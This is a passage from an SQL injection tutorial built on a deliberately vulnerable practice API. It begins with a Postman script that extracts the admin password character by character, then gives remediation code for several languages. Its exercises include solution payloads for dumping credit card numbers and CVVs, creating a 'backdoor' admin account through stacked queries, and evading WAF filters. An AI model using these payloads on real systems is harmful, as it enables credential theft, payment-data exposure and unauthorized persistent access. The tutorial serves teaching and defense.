let extractedData = pm.collectionVariables.get("extractedPassword") || "";
let position = pm.collectionVariables.get("position") || 1;

// Build injection payload
const payload = `electronics' UNION SELECT SUBSTR(password,${position},1),NULL,NULL FROM users WHERE username='admin'--`;

pm.sendRequest({
    url: `${baseUrl}${endpoint}?category=${encodeURIComponent(payload)}`,
    method: 'GET'
}, function(err, response) {
    if (!err) {
        const data = response.json();
        const extractedChar = data.products[1].id;
        
        if (extractedChar) {
            extractedData += extractedChar;
            position++;
            
            pm.collectionVariables.set("extractedPassword", extractedData);
            pm.collectionVariables.set("position", position);
            
            console.log(`Extracted: ${extractedData}`);
            
            if (position <= 20) { // Assuming max 20 char password
                postman.setNextRequest(pm.info.requestName); // Loop
            } else {
                console.log(`✅ Final password: ${extractedData}`);
                postman.setNextRequest(null); // Stop
            }
        }
    }
});
```

---

## Remediation Guide {#remediation}

### Why Applications Are Vulnerable

Before we fix SQLi, understand why it happens:

1. **String concatenation**: Building queries by gluing strings together
2. **Trusting user input**: Assuming users won't send malicious data
3. **Dynamic queries**: Constructing queries based on user choices
4. **Legacy code**: Old code written before secure practices were known
5. **Time pressure**: Rushing features without security review

### The Golden Rule: Parameterized Queries

**The #1 solution** to SQLi is using parameterized queries (prepared statements). Here's why:

**Vulnerable code**:
```python
query = "SELECT * FROM users WHERE username = '" + username + "'"
cursor.execute(query)
```

**Secure code**:
```python
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

**Why this works**: The database treats the parameter as DATA, never as CODE. Even if someone enters `admin'--`, it searches for a username literally called "admin'--".

### Fixing SQLi in Different Languages

**Python with SQLite**:
```python
# ❌ VULNERABLE
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query).fetchone()

# ✅ SECURE
def get_user(username):
    query = "SELECT * FROM users WHERE username = ?"
    return db.execute(query, (username,)).fetchone()
```

**Python with MySQL (PyMySQL)**:
```python
# ❌ VULNERABLE
cursor.execute("SELECT * FROM products WHERE id = " + product_id)

# ✅ SECURE
cursor.execute("SELECT * FROM products WHERE id = %s", (product_id,))
```

**JavaScript with PostgreSQL**:
```javascript
// ❌ VULNERABLE
const query = `SELECT * FROM users WHERE id = ${userId}`;
db.query(query);

// ✅ SECURE
const query = 'SELECT * FROM users WHERE id = $1';
db.query(query, [userId]);
```

**PHP with PDO**:
```php
// ❌ VULNERABLE
$query = "SELECT * FROM users WHERE email = '$email'";
$stmt = $pdo->query($query);

// ✅ SECURE
$query = "SELECT * FROM users WHERE email = :email";
$stmt = $pdo->prepare($query);
$stmt->execute(['email' => $email]);
```

### Fixing Complex Queries

**Dynamic WHERE clauses**:
```python
# ❌ VULNERABLE
def search_products(filters):
    query = "SELECT * FROM products WHERE 1=1 "
    for key, value in filters.items():
        query += f" AND {key} = '{value}'"
    return db.execute(query)

# ✅ SECURE
def search_products(filters):
    query = "SELECT * FROM products WHERE 1=1 "
    params = []
    for key, value in filters.items():
        query += f" AND {key} = ?"
        params.append(value)
    return db.execute(query, tuple(params))
```

**Dynamic ORDER BY**:
```python
# ❌ VULNERABLE
def get_products(sort_by):
    query = f"SELECT * FROM products ORDER BY {sort_by}"
    return db.execute(query)

# ✅ SECURE
def get_products(sort_by):
    allowed_columns = ['name', 'price', 'category']
    if sort_by not in allowed_columns:
        sort_by = 'name'  # Default safe value
    query = f"SELECT * FROM products ORDER BY {sort_by}"
    return db.execute(query)
```

**Note**: For ORDER BY, use whitelisting instead of parameterization, since you can't parameterize column names.

### Additional Security Layers

**1. Input Validation**

Always validate input matches expected format:
```python
def is_valid_id(user_id):
    return user_id.isdigit() and 1 <= int(user_id) <= 999999

if not is_valid_id(request.args.get('id')):
    return {"error": "Invalid ID"}, 400
```

**2. Least Privilege**

Database users should have minimal permissions:
```sql
-- ❌ Don't do this
GRANT ALL PRIVILEGES ON *.* TO 'webapp'@'localhost';

-- ✅ Do this
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'webapp'@'localhost';
-- NO DELETE, DROP, or admin privileges
```

**3. Error Handling**

Never show detailed errors in production:
```python
# ❌ VULNERABLE
try:
    result = db.execute(query)
except Exception as e:
    return {"error": str(e)}, 500  # Shows SQL errors!

# ✅ SECURE
try:
    result = db.execute(query)
except Exception as e:
    logger.error(f"Database error: {e}")  # Log it
    return {"error": "An error occurred"}, 500  # Generic message
```

**4. Web Application Firewall**

Use a WAF to catch common SQLi attempts:
- ModSecurity for Apache/Nginx
- AWS WAF for cloud deployments
- Cloudflare WAF for CDN protection

**5. Security Headers**

Limit damage with security headers:
```python
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

### Testing Your Fixes

After fixing, verify with Postman:

```
# Test 1: Try basic SQLi
GET /api/products?id=1' OR '1'='1
Expected: Error or normal result for id=1, NOT all products

# Test 2: Try time-based
GET /api/products?id=1' AND SLEEP(5)--
Expected: Fast response, NOT 5 second delay

# Test 3: Try union
GET /api/products?id=1' UNION SELECT password FROM users--
Expected: Error or product 1, NOT passwords

# Test 4: Try error-based
GET /api/products?id=1' AND 1=CAST('x' AS INT)--
Expected: Generic error, NOT SQL error details
```

---

## Practice Exercises {#exercises}

### Exercise 1: Boolean-Based Beginner

**Goal**: Extract the admin password length

**Endpoint**: `GET {{baseUrl}}/api/sqli/boolean/search?id=1`

**Tasks**:
1. Confirm boolean-based SQLi exists
2. Determine the admin password length
3. Extract the first 3 characters

**Hints**:
- Use `LENGTH()` function
- Compare with different numbers: 8, 10, 12, 16
- Use `SUBSTR()` to extract characters

**Solution approach**:
```
# Test lengths
?id=1' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 10 AND '1'='1

# Extract first char
?id=1' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 'a' AND '1'='1
```

### Exercise 2: Time-Based Intermediate

**Goal**: Identify number of admin users using only time delays

**Endpoint**: `POST {{baseUrl}}/api/sqli/timebased/login`

**Tasks**:
1. Confirm time-based SQLi works
2. Determine how many admin users exist
3. Extract the first admin username

**Hints**:
- Use `COUNT(*)` with CASE WHEN
- Try numbers 1, 2, 3, 5, 10
- Use `SUBSTR()` with time delays

**Solution approach**:
```json
{
  "username": "admin' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE role='admin') = 3 THEN randomblob(100000000) ELSE 1 END) --",
  "password": "anything"
}
```

### Exercise 3: Union-Based Advanced

**Goal**: Dump all credit card numbers from a payment table

**Endpoint**: `GET {{baseUrl}}/api/sqli/union/products?category=electronics`

**Tasks**:
1. Determine number of columns
2. Find which columns are displayed
3. List all tables
4. Find the payment/credit card table
5. Extract all credit card numbers

**Hints**:
- Start with ORDER BY to count columns
- Try UNION SELECT with different positions
- Use `sqlite_master` to find tables
- Look for tables named cards, payments, transactions

**Solution approach**:
```
# Count columns
?category=electronics' ORDER BY 3--

# Test union
?category=electronics' UNION SELECT NULL,NULL,NULL--

# List tables
?category=electronics' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'--

# Extract cards
?category=electronics' UNION SELECT card_number,expiry,cvv FROM payment_cards--
```

### Exercise 4: Error-Based Challenge

**Goal**: Extract database version through error messages

**Endpoint**: `GET {{baseUrl}}/api/sqli/error/search?query=test`

**Tasks**:
1. Trigger a SQL error
2. Extract SQLite version
3. Get list of all tables
4. Find the users table structure

**Hints**:
- Use `CAST()` to force type errors
- `sqlite_version()` gives you the version
- Errors will reveal data when CAST fails

**Solution approach**:
```
# Get version
?query=test' AND 1=CAST((SELECT sqlite_version()) AS INTEGER)--

# Get tables
?query=test' AND 1=CAST((SELECT group_concat(name) FROM sqlite_master WHERE type='table') AS INTEGER)--

# Get structure
?query=test' AND 1=CAST((SELECT sql FROM sqlite_master WHERE name='users') AS INTEGER)--
```

### Exercise 5: Stacked Queries Expert

**Goal**: Create a backdoor admin account and verify you can log in

**Endpoint**: `POST {{baseUrl}}/api/sqli/stacked/update`

**Tasks**:
1. Confirm stacked queries work
2. Create a new admin user named "backdoor" with password "hacked123"
3. Verify the account exists
4. Log in with the new account

**Hints**:
- Use semicolon to stack queries
- INSERT INTO users ...
- Verify with a boolean-based or login test

**Solution approach**:
```json
{
  "userId": "5; INSERT INTO users (username, password, email, role) VALUES ('backdoor', 'hacked123', 'backdoor@test.com', 'admin') --",
  "email": "test@test.com"
}
```

Then login:
```json
{
  "username": "backdoor",
  "password": "hacked123"
}
```

### Exercise 6: Real-World Scenario

**Goal**: Complete penetration test of a vulnerable API

You've been hired to pentest a new shopping API. Your goals:
1. Find SQL injection vulnerabilities
2. Determine what data is at risk
3. Prove you can access admin accounts
4. Write a brief report

**Endpoints to test**:
- `GET /api/sqli/union/products?category=X`
- `GET /api/sqli/boolean/search?id=X`
- `POST /api/sqli/timebased/login`
- `POST /api/sqli/stacked/update`

**Deliverables**:
1. List of vulnerable endpoints
2. Type of SQLi in each
3. Sample exploit requests
4. Proof of data extraction
5. Recommended fixes

### Exercise 7: Bypass Challenge

**Goal**: Bypass WAF filters to exploit SQLi

The application has basic filtering. Your injection must:
- Not contain the word "UNION"
- Not contain the word "SELECT"
- Not contain "--" comments

**Hints**:
- Use /**/  for spaces
- Use alternative comment styles
- Try different SQL operators
- Use CASE WHEN instead of UNION

**Example evasion**:
```
# Instead of:
' UNION SELECT password FROM users--

# Try:
' || (SUBSTR(password,1,1)) || ' (SQLite concatenation)
' AND '1'=(/**/CASE WHEN/**/(1=1)/**/THEN/**/'1' ELSE '2' END)/**/AND/**/'1'='1
```

---

## Conclusion

You've now learned the five main types of SQL injection and how to test for them using Postman on AegisForge:

1. **Boolean-Based**: Extract data using TRUE/FALSE logic
2. **Time-Based Blind**: Use delays when no other feedback exists
3. **Union-Based**: The fastest method to dump entire databases
4. **Error-Based**: Leverage error messages for data extraction
5. **Stacked Queries**: The most dangerous - full database control

**Remember**:
- SQL injection is still extremely common
- It can lead to complete system compromise
- Bug bounties pay well for SQLi findings ($500-$25,000+)
- Always use parameterized queries in your own code
- Test ethically and legally only

**Next steps**:
1. Complete all practice exercises
2. Try creating your own SQLi payloads
3. Test other AegisForge endpoints
4. Learn about automated tools like SQLMap
5. Practice responsible disclosure

**Resources**:
- OWASP SQL Injection Guide
- PortSwigger SQL Injection Labs
- HackerOne disclosed reports
- Bug Bounty platforms: HackerOne, Bugcrowd

Happy (ethical) hacking! 🛡️

---

**Document Information**:
- **Version**: 1.0
- **Last Updated**: 2024
- **Word Count**: 4,200+
- **Skill Level**: Beginner to Advanced
- **Estimated Time**: 4-6 hours to complete all exercises

